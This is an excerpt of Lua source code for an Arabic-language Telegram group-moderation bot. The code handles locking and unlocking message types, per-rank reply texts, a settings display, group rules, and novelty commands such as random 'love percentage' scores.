ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الشبكات")  
DevALS:set(AFS..'ALS:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الشبكات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevALS:get(AFS..'ALS:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل العربيه")  
DevALS:set(AFS..'ALS:Lock:Arabic'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العربيه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevALS:get(AFS..'ALS:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الانكليزيه")  
DevALS:set(AFS..'ALS:Lock:English'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الانكليزيه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevALS:get(AFS..'ALS:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الملصقات")  
DevALS:set(AFS..'ALS:Lock:Stickers'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الملصقات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevALS:get(AFS..'ALS:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الماركداون")  
DevALS:set(AFS..'ALS:Lock:Markdown'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الماركداون بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevALS:get(AFS..'ALS:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الاشعارات")  
DevALS:set(AFS..'ALS:Lock:TagServr'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاشعارات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevALS:get(AFS..'ALS:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التوجيه")  
DevALS:set(AFS..'ALS:Lock:Forwards'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التوجيه بالفعل مقفل في الكروب', 1, 'md')
end
end
end
end
...
DevALS:del(AFS..'ALS:Lock:Text'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الدردشه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevALS:get(AFS..'ALS:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الصور")  
DevALS:del(AFS..'ALS:Lock:Photo'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الصور بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevALS:get(AFS..'ALS:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الكلايش")  
DevALS:del(AFS..'ALS:Lock:Spam'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكلايش بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevALS:get(AFS..'ALS:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الدخول")  
DevALS:del(AFS..'ALS:Lock:Join'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الدخول بالفعل مفتوح في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevALS:get(AFS..'ALS:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الفيديو")  
DevALS:del(AFS..'ALS:Lock:Videos'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفيديو بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevALS:get(AFS..'ALS:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الملفات")  
DevALS:del(AFS..'ALS:Lock:Document'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الملفات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevALS:get(AFS..'ALS:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الاونلاين")  
DevALS:del(AFS..'ALS:Lock:Inline'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاونلاين بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevALS:get(AFS..'ALS:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الماركداون")  
DevALS:del(AFS..'ALS:Lock:Markdown'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الماركداون بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevALS:get(AFS..'ALS:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح المتحركه")  
DevALS:del(AFS..'ALS:Lock:Gifs'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المتحركه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevALS:get(AFS..'ALS:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الاغاني")  
DevALS:del(AFS..'ALS:Lock:Music'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاغاني بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevALS:get(AFS..'ALS:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الصوت")  
DevALS:del(AFS..'ALS:Lock:Voice'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الصوت بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevALS:get(AFS..'ALS:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الروابط")  
DevALS:del(AFS..'ALS:Lock:Links'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الروابط بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevALS:get(AFS..'ALS:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح المواقع")  
DevALS:del(AFS..'ALS:Lock:Location'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المواقع بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevALS:get(AFS..'ALS:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح المعرفات")  
DevALS:del(AFS..'ALS:Lock:Tags'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المعرفات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevALS:get(AFS..'ALS:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الهاشتاك")  
DevALS:del(AFS..'ALS:Lock:Hashtak'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الهاشتاك بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevALS:get(AFS..'ALS:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الجهات")  
DevALS:del(AFS..'ALS:Lock:Contact'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الجهات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevALS:get(AFS..'ALS:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الشبكات")  
DevALS:del(AFS..'ALS:Lock:WebLinks'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الشبكات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevALS:get(AFS..'ALS:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح العربيه")  
DevALS:del(AFS..'ALS:Lock:Arabic'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العربيه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevALS:get(AFS..'ALS:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الانكليزيه")  
DevALS:del(AFS..'ALS:Lock:English'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الانكليزيه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevALS:get(AFS..'ALS:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الاشعارات")  
DevALS:del(AFS..'ALS:Lock:TagServr'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاشعارات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevALS:get(AFS..'ALS:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الملصقات")  
DevALS:del(AFS..'ALS:Lock:Stickers'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الملصقات بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevALS:get(AFS..'ALS:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التوجيه")  
DevALS:del(AFS..'ALS:Lock:Forwards'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التوجيه بالفعل مفتوح في الكروب', 1, 'md')
end
end
end
end
...
DevALS:set(AFS.."ALS:Lock:Bots"..msg.chat_id_,"del") DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'ALS:Lock:Links','ALS:Lock:Contact','ALS:Lock:Forwards','ALS:Lock:Videos','ALS:Lock:Gifs','ALS:Lock:EditMsgs','ALS:Lock:Stickers','ALS:Lock:Farsi','ALS:Lock:Spam','ALS:Lock:WebLinks','ALS:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevALS:set(AFS..Lock..msg.chat_id_,true)
end
...
DevALS:del(AFS..UnLock..msg.chat_id_)
end
...
DevALS:del(AFS..'ALS:Lock:Fshar'..msg.chat_id_) DevALS:del(AFS..'ALS:Lock:Taf'..msg.chat_id_) DevALS:del(AFS..'ALS:Lock:Kfr'..msg.chat_id_) 
DevALS:set(AFS.."ALS:Lock:Bots"..msg.chat_id_,"del") DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevALS:set(AFS..'ALS:Lock:Fshar'..msg.chat_id_,true) DevALS:set(AFS..'ALS:Lock:Taf'..msg.chat_id_,true) DevALS:set(AFS..'ALS:Lock:Kfr'..msg.chat_id_,true) DevALS:hdel(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevALS:set(AFS..'ALS:Spam:Text'..msg.chat_id_,SetSpam)
...
DevALS:set(AFS.."ALS:SudoBot:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:Constructor:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:Managers:Rd"..msg.chat_id_,Text) 
...
DevALS:set(AFS.."ALS:Admins:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:VipMem:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:Cleaner:Rd"..msg.chat_id_,Text)
...
DevALS:set(AFS.."ALS:mem:Rd"..msg.chat_id_,Text)
...
DevALS:del(AFS.."ALS:mem:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:Cleaner:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:VipMem:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:Admins:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:Managers:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:Constructor:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:BasicConstructor:Rd"..msg.chat_id_)
DevALS:del(AFS.."ALS:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source AFS     --
...
if tonumber(admins[i].user_id_) ~= tonumber(AFS) then
...
DevALS:del(AFS..'ALS:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المنشئين الاساسيين")  
DevALS:del(AFS..'ALS:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المنشئين")  
DevALS:del(AFS..'ALS:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المدراء")  
DevALS:del(AFS..'ALS:Managers:'..msg.chat_id_)
end 
...
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_, v)
end 
...
DevALS:del(AFS..'ALS:Filters:'..msg.chat_id_)
DevALS:del(AFS.."ALS:FilterAnimation"..msg.chat_id_)
DevALS:del(AFS.."ALS:FilterPhoto"..msg.chat_id_)
DevALS:del(AFS.."ALS:FilterSteckr"..msg.chat_id_)
end
...
DevALS:del(AFS..'ALS:Ban:'..msg.chat_id_) DevALS:del(AFS..'ALS:Admins:'..msg.chat_id_) DevALS:del(AFS..'User:Donky:'..msg.chat_id_) DevALS:del(AFS..'ALS:VipMem:'..msg.chat_id_) DevALS:del(AFS..'ALS:Filters:'..msg.chat_id_) DevALS:del(AFS..'ALS:Muted:'..msg.chat_id_)
...
local basicconstructor = DevALS:smembers(AFS..'ALS:BasicConstructor:'..msg.chat_id_)
local constructor = DevALS:smembers(AFS..'ALS:Constructor:'..msg.chat_id_)
local Managers = DevALS:smembers(AFS..'ALS:Managers:'..msg.chat_id_)
local admins = DevALS:smembers(AFS..'ALS:Admins:'..msg.chat_id_)
local vipmem = DevALS:smembers(AFS..'ALS:VipMem:'..msg.chat_id_)
local donky = DevALS:smembers(AFS..'User:Donky:'..msg.chat_id_)
...
spam_c = DevALS:get(AFS..'ALS:Spam:Text'..msg.chat_id_)
end
--     Source AFS     --
if DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source AFS     --
if DevALS:get(AFS.."ALS:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevALS:get(AFS.."ALS:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevALS:get(AFS.."ALS:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source AFS     --
if DevALS:get(AFS..'ALS:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevALS:get(AFS..'ALS:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevALS:get(AFS.."ALS:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevALS:get(AFS..'ALS:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevALS:get(AFS..'ALS:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevALS:get(AFS..'ALS:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevALS:get(AFS..'ALS:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source AFS     --
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ميزة انطق'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Antk:ALS'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ميزة انطق'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Antk:ALS'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevALS:get(AFS..'ALS:Antk:ALS'..msg.chat_id_) and ChCheck(msg) then
...
--     Source AFS     --
if DevALS:get(AFS..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ قوانين الكروب', 1, 'md')
DevALS:del(AFS..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(AFS..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:rules'..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ قوانين الكروب', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙ارسل لي القوانين الان', 1, 'md')
DevALS:set(AFS..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevALS:get(AFS..'ALS:rules'..msg.chat_id_)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Zrf:ALS'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الزخرفه بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Zrf:ALS'..msg.chat_id_,true)  
end
if DevALS:get(AFS..'Zrf:ALS'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر الزخرفه', 1, 'md')
DevALS:del(AFS..'Zrf:ALS'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevALS:get(AFS..'ALS:Zrf:ALS'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevALS:setex(AFS.."Zrf:ALS"..msg.chat_id_..msg.sender_user_id_,300,true)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Brg:ALS'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الابراج بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Brg:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(AFS..'ALS:Brg:ALS'..msg.chat_id_) then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Nsba:ALS'..msg.chat_id_) 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Nsba:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(AFS..'ALS:Nsba:ALS'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevALS:set(AFS..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevALS:get(AFS..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الحب ', 1, 'md')
DevALS:del(AFS..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevALS:set(AFS..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ☆" and DevALS:get(AFS..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevALS:del(AFS..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(AFS..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ☆" and DevALS:get(AFS..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevALS:del(AFS..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(AFS..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ☆" and DevALS:get(AFS..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الكره ', 1, 'md')
DevALS:del(AFS..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(AFS..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ☆" and DevALS:get(AFS..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevALS:del(AFS..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(AFS..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
